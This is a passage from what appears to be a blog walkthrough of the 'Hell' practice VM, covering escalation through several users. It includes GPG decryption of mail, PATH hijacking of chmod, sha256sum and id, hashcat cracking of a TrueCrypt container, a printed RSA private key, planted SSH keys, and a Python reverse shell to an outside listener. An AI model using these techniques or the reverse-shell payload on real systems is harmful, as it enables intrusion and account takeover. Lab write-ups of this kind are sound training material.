rerlq1CY6/T70KsY6GyBoU3iKFgsIkwcb6whrlR/6SCK2vNmLlz2AfDSITYY+6vZ
MWXhiYbZSRyHq7gaYRKS6kzG6uLlsyq4YnQzhz8M+sm4dePDBvs7U6yAPJf4oAAH
9o01Fp3IJ1isvVMH5Fr8MwQjOAuo6Yh6TwbOrI/MVpphJQja8gDKVYr2tlqNS5me
V8xJ7ZUxsh67w/5s5s1JgEDQt+f4wckBc8Dx5k9SbS9iRUbZ0oLJ3IM8cUj3CDoo
svsh0u4ZWj4SrLsEdErcNX6gGihRl/xs3qdVOpXtesSvxEQcWHLqtMY94tb29faD
+oQPjG3V4cSY5r566esUAlCn7ooYyx6Dug==
=svWU
-----END PGP MESSAGE-----
```

I loaded the private GPG key into jacks keyring with:

```bash
$ gpg --import .pgp/pgp.priv
gpg: keyring `/home/jack/.gnupg/secring.gpg' created
gpg: key 3F18AB0A: secret key imported
gpg: key 3F18AB0A: public key "jack@cowlovers.com" imported
gpg: Total number processed: 1
gpg:               imported: 1  (RSA: 1)
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
```

Ofc this doesn’t mean I can actually use it yet, however there was a note about the password, so I could possibly just try all the ones I have found so far for jack. Decrypting the encrypted message we found for jack was as simple as:

```bash
$ gpg /var/mail/jack/received/message.eml

You need a passphrase to unlock the secret key for
user: "jack@cowlovers.com"

# used the password g0tmi1k69 found in the MySQL database

2048-bit RSA key, ID 3F18AB0A, created 2014-06-18

gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 2048-bit RSA key, ID 3F18AB0A, created 2014-06-18
      "jack@cowlovers.com"
gpg: /var/mail/jack/received/message.eml: unknown suffix
Enter new filename [text.txt]:
gpg: WARNING: message was not integrity protected

$ cat text.txt
Ok Jack. I've created the account 'milk_4_life' as per your request. Please stop emailing me about this now or I'm going to talk to HR like we discussed.

The password is '4J0WWvL5nS'
```

So, lets ssh in as `milk_4_life`...

```bash
root@kali:~# ssh milk_4_life@192.168.56.102
milk_4_life@192.168.56.102's password:
Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
$ id
uid=1002(milk_4_life) gid=1002(milk_4_life) groups=1002(milk_4_life)
```

Easy :D

## becoming george
The user `milk_4_life` has a `game` in hes home folder.

```bash
$ ls -lah game
---s--x--x 1 george george 5.7K Jun 19 18:24 game

$ ./game
I'm listening
```

Not a very interesting game thus far. I decided to quit and rerun the game, this time backgrounding it with `&`. At this stage I wanted to run a netstat to see if it is _listening_ on a port or something, but the netstat command was not available. I figured I could cause a error as the same port can not be opened twice. So, with `./game &` already running, another instance of `./game` errored out, revealing the listening port:

```bash
$ ./game &
I'm listening

$ ./game
Traceback (most recent call last):
  File "/usr/bin/game.py", line 58, in <module>
    tcpSocket.bind(("0.0.0.0", 1337))
  File "/usr/lib/python2.7/socket.py", line 224, in meth
    return getattr(self._sock,name)(*args)
socket.error: [Errno 98] Address already in use
Lol nope
$
```

tcp/1337 it is. Lets telnet to this:

```bash
milk_4_life@hell:~$ telnet 127.0.0.1 1337
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.
Type 'START' to begin

START
Starting...

You have 30 seconds to get as many points as you can, beat the high score! (High Score: 133723)

Quick what's... 397 x 358? 1
Quick what's... 498 x 111? 2
Quick what's... 740 x 772?
Final Score: 0

Connection closed by foreign host.
milk_4_life@hell:~$
```

Typing anything other than `START` would simply cause the script to die. Typing a non integer as a answer causes a loop, and that is about it.
Sooo, time to win this game and see what would happen. I decided to attempt this with a python script. The general idea would be to read the socket output, calculate the answer and send that back. This resulted in a script as follows (yeah I know its not perfect but gets the job done):

```python
#!/usr/bin/python
import socket, sys

# start a socket
sock = socket.socket()
# connect locally
sock.connect(('127.0.0.1', 1337))
ret = sock.recv(1024)   # read 1024 bytes
print '[I] %s' % ret.strip()
# start the game
print '[O] START'
sock.send('START\n') # START the game
ret = sock.recv(1024)   # read 1024 bytes
print '[I] %s' % ret.strip()

# Start reading the socket input and calculating answers sending them back
while True:
   ret = sock.recv(1024)
   print '[I] %s' % ret.strip()

   # split by spaces
   ret = ret.split(' ')

   # a question line
   if ret[0] == 'Quick':
      # extract the 2 integers from:
      # ['Quick', "what's...", '435', 'x', '574?', '']
      one = int(ret[2])
      two = int(ret[4].replace('?',''))   # remove the comma
      answer = one * two
      print '[O] Answer %s' % answer
      sock.send(str(answer) + '\n')

   # once the 30 seconds passes, a line with Final will return. This
   # is the end of the game
   elif ret[0] == 'Final':
      print 'Done?'
      sock.close()
      sys.exit(0)

   # if we dont know what to do, just 'press enter'
   else:
      sock.send('\n')
sock.close()
```

I ran this in another session with `./game` running and won :P Once you win, the output results in:

```bash
!*!*!*!*! Congratulations, new high score (302785) !*!*!*!*!

I hear the faint sound of chmodding.......
```

... and ends. Heh, ok. Well that was probably not exactly what I hoped for, but nonetheless, the chmodding is at least a hint. The first thing that came to mind is a important file that was previously not available now possibly is as its been chmodded by `george` after winning the game. Or, if it is in fact a chmod that is being run, is it being called via a system command from its full path (/usr/bin/chmod), or just via chmod?

To test, I fired up another editor on `chmod.py` and just put a line to echo test. I `chmod +x` this and moved the file to `/tmp`. I then added `/tmp` to `PATH` via `export PATH=/tmp:$PATH`:

```bash
milk_4_life@hell:~$ python chmod.py          # test the script
Testing chmod exec
milk_4_life@hell:~$ cp chmod.py /tmp/chmod   # copy it to /tmp
milk_4_life@hell:~$ chmod +x /tmp/chmod      # make it executable
milk_4_life@hell:~$ /tmp/chmod               # test it
Testing chmod exec
milk_4_life@hell:~$ export PATH=/tmp:$PATH   # prefix PATH with /tmp
milk_4_life@hell:~$ chmod                    # test it without full path
Testing chmod exec
milk_4_life@hell:~$ ./game                   # start the game
I'm listening
Testing chmod exec                           # profit :)
```

With it confirmed that `chmod` was not called from its full path once you win the game (using our previously mentioned winning script :D), it was time to edit our `chmod` script to be slightly more useful:

```python
#!/usr/bin/python
import pty
pty.spawn('/bin/sh')
```

With this now in /tmp/chmod, I reran `./game.py`, and then `./play_game.py`. After 30 seconds on the session we started the game we had:

```bash
milk_4_life@hell:~$ ./game
I'm listening
$ id
uid=1002(milk_4_life) gid=1002(milk_4_life) euid=1000(george) groups=1000(george),1002(milk_4_life)
$
```

Profit! We now have access to `george`'s home directory :) In order to make the next steps easier, I quickly generated a new ssh key pair using `ssh-keygen`, and added the contents of the resultant `id_rsa.pub` to `.ssh/authorized_keys`. Whats important to note in the below snippet is that the full path of `chmod` is used. If we don’t, we will be hitting the chmod we just fooled to get to this shell in the first place :D

```bash
$ id
uid=1002(milk_4_life) gid=1002(milk_4_life) euid=1000(george) groups=1000(george),1002(milk_4_life)
$ cd /home/george
$ mkdir .ssh
$ /bin/chmod 755 .ssh
$ cd .ssh
$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3KB7V05tHJAWFavTgTK1dDIcUUVyUpZA3TYQhydNjeexWDeVzPNUGCo3/XZNgqw0QpaoX5eLm9k9OqxNyr7x5B6Rq2F7ykA0DHglbM4DLJDQRawHgoCzTwxBWAMva3HUbahounJFe9fOaECGZEsCmTF1462wTuZ/SYOO9lSHv38cO8b9nC5lteBz2An34+W/n9X1sxBAlDAHyXmAqJYpoE+gur+YX8j3WPNJbiBu3nVnvpDaR1BnvN1n74/yUtLYziT5Gt7lgRWiaDhzslR+46xbu/YmCyO03ztHhD/lD2JAcoEe43FKFUdh8ZGfBqCq0CbBB86KHhhLzV6QjLHjV root@kali" > authorized_keys
$ /bin/chmod 600 authorized_keys
```

Now we can SSH into the VM as `george`

```bash
root@kali:~# ssh george@192.168.56.102 -i id_rsa
Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
No mail.
Last login: Sat Jul  5 19:26:25 2014
george@hell:~$
```

## becoming bazza
George's home directory had what looked like a TrueCrypt container `4.0M Jun 19 21:09 container.tc` in hes home directory. TrueCrypt appeared to be installed on the VM, and attempting to mount the container failed due to an invalid keyfile and or password.

`george` also had mail in `/var/mail`:

```bash
george@hell:~$ cat /var/mail/george/signup.eml
From: admin@rockyou.com
To: super_admin@hell.com
Subject: Account Activation
Date: 13th November 2009

Thanks for signing up for your account. I hope you enjoy our services.
george@hell:~$
```

There is a mention of _rockyou_ in the From address. There is a famous rockyou wordlist used for password cracking out in the wild. With that in mind, and the fact that it was 0430 already, I decided to copy the `container.tc` to my Kali Linux install, and have `truecrack` have a go at it while I catch up on some much deserved sleep.

### fast forward a few hours
A few hours passed, with 0 luck on cracking the password for the container. I started to realize that this _may_ not be the correct path in getting the container open, assuming that is the next step. However, as a last resort, I opted to copy the files onto my Windows gaming PC and run it via a GPU cracker, [oclHashcat](http://hashcat.net/oclhashcat/).

```bash
C:\Users\Somedude\Downloads\oclHashcat-1.21\oclHashcat-1.21>oclHashcat64.exe
-m 6211 C:\Users\Somedude\Desktop\Hell\container.tc C:\Users\Somedude\Desktop\Hell\rockyou.txt

[snip]

C:\Users\Somedude\Desktop\Hell\container.tc:letsyouupdateyourfunnotesandmore

Session.Name...: oclHashcat
Status.........: Cracked
Input.Mode.....: File (C:\Users\Somedude\Desktop\Hell\rockyou.txt)
Hash.Target....: File (C:\Users\Somedude\Desktop\Hell\container.tc)
Hash.Type......: TrueCrypt 5.0+ PBKDF2-HMAC-RipeMD160 + AES
Time.Started...: Sun Jul 20 14:26:08 2014 (19 secs)
Speed.GPU.#1...:    14578 H/s
Speed.GPU.#2...:    16165 H/s
Speed.GPU.#*...:    30743 H/s
Recovered......: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.......: 563201/14343297 (3.93%)
Skipped........: 0/563201 (0.00%)
Rejected.......: 1/563201 (0.00%)
HWMon.GPU.#1...: 64% Util, 54c Temp, 43% Fan
HWMon.GPU.#2...:  0% Util, 90c Temp, 100% Fan

Started: Sun Jul 20 14:26:08 2014
Stopped: Sun Jul 20 14:26:42 2014
```

About 19 seconds later, we have the password thanks to hashcat!

So, lets mount the container and see whats inside:

```bash
george@hell:~$ truecrypt container.tc
Enter mount directory [default]:
Enter password for /home/george/container.tc: letsyouupdateyourfunnotesandmore
Enter keyfile [none]:
Protect hidden volume (if any)? (y=Yes/n=No) [No]:

george@hell:~$ cd /media/truecrypt1/
george@hell:/media/truecrypt1$ ls -lah
total 22K
drwx------ 2 george george  16K Jan  1  1970 .
drwxr-xr-x 4 root   root   4.0K Jul 21 18:50 ..
-rwx------ 1 george george 1.7K Jul  5 20:01 id_rsa
george@hell:/media/truecrypt1$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAxlCbg0ln2dqRO3iIXPUvK3irg/9l5uvBAQdXTVmcm/JWN9OA
25XtZX8LOfiJtc+8OYXgD6lXNVPh9BjElq6qpR7fk1TaXXUlyiSlwCxz68n/cpYs
f6UUa9QXm0LSHD8m7g/e5qqIm8bb15TIC6+8TmSB11FE9NLPN+8hVyP1S9EBntom
t5watKDFUNF+mcl14Tj+INcWB2qpEPgZ1mIwq1Zw3w/vy27y0i1r52+fot1vgf2K
Ymo6GipsdxW1k/UuCjJEE6e0GZFA8vhpH5F4MG8k33vIPqkxgEgF0GX8RPAQF/Xf
gxERhkGP+hVOd8b11OXzxWGGQyqwOYF8+7qVjwIDAQABAoIBAQCyldpFUvBDXbEV
dgiOdXkh04vY1UBlv/3ROFQk4sLGKGf94+gRViUvFkX80VTptgWRY36Pe/Z9nmlG
0JsP+oDPK0s4uNvf92Otcm0U7rMBLals/dFarUUDiT4s4fKl3zTmgsI+xGk6psxI
icHPzFRt39KRHK1VLxXOD/jdKRN3Tk0odH1kNahOuFC2F5T+aqdlC/RAGwxnTDBe
AFPFlns83GaPYlIt05DZsdGftG7mITkNfUVS5AIyeedshU4OyPXu5bGgUgbtars4
GdttJ33Tm5hO+n3E93sW7XMKG4v4po+1Fu0OwNQNpaRo6gVqK7AZHNPxBRW7K4Zc
w2d0EXehAoGBAOQgtqb5QVyhiCdT53xjZTMHH74ApWRpsoLtu/LaZnQV0v/dzEIv
jei58v/PusXsSwOQeb4p2obOReQFbYG48vCiywwMbeOeqH2d69HYatHmxPXngKS3
6trus/pHuDJosFw1qhgVo9ao0o8IH6cveHidmwvzKfiphgM3yCXF9jyxAoGBAN6L
awHXmHQCsCq//UbHbfuaBScJOpaagKP1BIskl5RDaQ/U/DzSpxju0ldedX7HYVFW
Rk6NQQ6QiXIC/5D7Xj+tcR2EFI+Tt9xp6dE/UlxpUL1h9QCBfmdw0CT9WSwJEGF7
R+D18trKcb/NkYdJV8ZpaT00rLzyBx5MY/FZbYY/AoGBALrCwWXfR5BjOckgmrGt
2cq1uVnew4h6M8eWgzklbZz5xPzuAuvobKAro3GkCb9BXIQ1gkWZlCqqsnMjsmvy
EwnH7L0Xa9teJ4h3gfkQ2Rqwd2ztstanLyE/LJ7omjbCmCdVU8RV6wSwv3iTaP6B
EXqFZMqarzDA8FKwFy49bAJxAoGBALkXBYG7uW1LSw/TLCjw9zVaTUzBLTxS9gjn
YMcFQRir1Da5sqw3m4huIP1Pb7NoyjTm54SvkNs3NUlg2wPPPP0DGOAumRctCa9F
W5WP78UyRlesoCOyj9oihsss9zxbsYcSDJ86j6iO1Xpr08zMIDfCNigUplJjja4S
ZNE3ypLrAoGAbp+vBcqQRfnXWfmcdnHYFbwgWbokPSe2fScajWiyvcg4/6gL1e50
rpO3RTOREUD02pBbyG4LDFv7x/5niqASL0tS8/0xWDBDj5QmD9UTmMd5hsMbj8Lw
qJA0ErZEjIE9+jXYLbsTsB8tRTsqMqBfCCovHXAjy0h5B6j500PfImM=
-----END RSA PRIVATE KEY-----
george@hell:/media/truecrypt1$
```

So, a rsa private key. A wild shot in the dark sais this is the private key for one of the other users as per the `/etc/passwd`. I saved the key to a file on my Kali Linux box and attempted to SSH in as `bazza`, specifying the private key to use:

```bash
root@kali:~# ssh bazza@192.168.56.102 -i truecrypt_id_rsa
Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Jul 21 18:52:50 2014 from 192.168.56.1
$ id
uid=1004(bazza) gid=1004(bazza) groups=1004(bazza)
$
```

## becoming oj
`bazza` had 2 interesting files in hes home directory:

```bash
bazza@hell:~$ ls -lh
total 20K
-rw-r--r-- 1 root root        109 Jul  6 18:32 barrebas.txt
-r-xr-sr-x 1 oj   developers 6.1K Jul  6 18:39 part1
-r-sr-xr-x 1 oj   oj         5.2K Jul  6 18:34 part2
```

The `barrebas.txt` looks to be a shoutout to the tester of the vulns. `part1` & `part2` from first glance had interesting permissions, and made it relatively easy to determine that the next user we should be after this is `oj`. Running `part1` and `part2`:

```bash
bazza@hell:~$ ./part1
Checking integrity of part2... Done!!

Checking integrity of calling target... Done!!

Binary and target confirmed.

Can't touch this *nah na na na na naaaaaaaa nah*
uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)

bazza@hell:~$ ./part2


Error! 1004 ID detected ... youre not allowed to run this, please use part 1!
bazza@hell:~$
```

So it seems that part2 is protected apparently due to the fact that our uid (or groupid?) of 1004 was not allowed. Slightly cryptic, but a few thoughts about what the binaries are doing were already going about. `part1` outputs what looks like the output of the `id` command too.

Again, this part took some time and resulted in a rabbit-hole scenario of try something, google something, try something, google something. I am not going to go through everything I have tried for this part, but simply try depict how I managed to figure this out in the end.

We start with a `strings` of `part1`:

```bash
bazza@hell:~$ strings part1
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
puts
popen
printf
fgets
system
pclose
strcmp
__libc_start_main
GLIBC_2.1
GLIBC_2.0
PTRh
QVhl
[^_]
900462fbf9593f1a4b753f1729c431abc80932a151e9b293e13822a91f9641c1  /home/bazza/part2
1003a011c5bdb65a07a8f92feb6b7d7ecbf3a3ff0f2a46abbe5c777c525996d8  /usr/bin/id
Checking integrity of part2...
sha256sum /home/bazza/part2
Failed to run command
 Done!!
Checking integrity of calling target...
sha256sum /usr/bin/id
Uh oh.... Corrupted or in wrong directory (/home/bazza/)
 Done!!
Binary and target confirmed.
/home/bazza/part2
Target corrupt
;*2$"
```

This should give you a pretty good idea of what is potentially going on in the binary, like:

   - Check the sha256sum of /gome/bazza/part matches 900462fbf9593f1a4b753f1729c431abc80932a151e9b293e13822a91f9641c1
   - Check the sha256sum of /usr/bin/id matches 1003a011c5bdb65a07a8f92feb6b7d7ecbf3a3ff0f2a46abbe5c777c525996d8
   - Eventually Fail if these don’t match.

The key lies in the fact that the `sha256sum` command does not appear to be called from its full path location ie: /usr/bin/sha256sum. So, similar to how we fooled the `chmod` earlier, we are going to do exactly the same with the `sha256sum`.

As before, we create a _evil sha256sum_ command, which is actually just a python script to spawn `/bin/sh`, then prefix `PATH` with `/tmp` and run `./part1`. For this one however, I was having trouble with the pty.spawn() and didn't really feel like troubleshooting that much. So I opted for a (reverse shell)[http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet] payload instead to open on a netcat listener that I have on my host laptop:

```python
#!/usr/bin/python
import socket,subprocess,os

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.56.1",4444))

os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)

p = subprocess.call(["/bin/sh","-i"])
```

I spawned a `netcat` listener on my laptop using `nc -l 4444`, and ran `./part1`:


```bash
→ nc -l 4444
$ id
uid=1004(bazza) gid=1004(bazza) egid=1003(developers) groups=1004(bazza)
```

Notice that I was now in the `developers` group. I was now allowed to run `./part2` too... with a verbose line showing me the permissions I would need to gain access to `/home/oj`:

```bash
$ ./part2
uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)

Can't touch this *nah na na na na naaaaaaaa nah*
$
```
And, as expected, I spent some time on this binary too. I didn't expect `part2` to be any easier :P
After taking a break, I realized that the output that looks like that of `/usr/bin/id`, probably **is** that if it. So, off I went and did another `sha256sum`, type script, this time just with another reverse shell to port 4445, and naming it `id` so that part2 will pick it up:

```bash
→ nc -l 4445
$ /usr/bin/id
uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)

$ cd /home/oj
$ ls -lh
total 584K
-r-sr-xr-x 1 root root 579K Jul  5 21:12 echo
-rw-r--r-- 1 root root  154 Jul  5 21:06 How to be an infosec rockstar 101.txt
$
```

And there we are! Group membership for `oj`, and access to `/home/oj`

## becoming root
As with all of the other users, I added myself a ssh key for easy access.

Now, sadly I have to admit that this is as far as I have been able to come. `oj` has a binary called `echo` (not to be confused with the builtin echo), that, as expected, will echo what you input.

```bash
oj@hell:~$ ./echo onetwothree
onetwothree
oj@hell:~$
```

I toyed with the inputs and noticed that when I entered inputs prefixed with a %, some strange stuff started to happen. Google helped me towards learning that this is what is called a [Format String Attack](https://www.owasp.org/index.php/Format_string_attack)

```bash
oj@hell:~$ ./echo %08x.%08x.%08x
080488c0.bffffcf8.00000000
oj@hell:~$
```

I am however satisfied that I have come this far, and will definitely endeavor to nail this format string vuln sometime. But that time is not now.

**Edit:** One way to root the machine is to make use of the fact that you can run `truecrypt` as `root`, and provide a evil container, spawning you a `root` shell. An example of this can be seen [here](http://vinicius777.github.io/blog/2014/07/14/truecrypt-privilege-escalation/) (and actually references this VM)

## summary
Hell sure as heck taught me a lot and was one fun experience! Shoutout to [@0x42424242](https://twitter.com/@0x42424242) for the time taken to make this VM available.
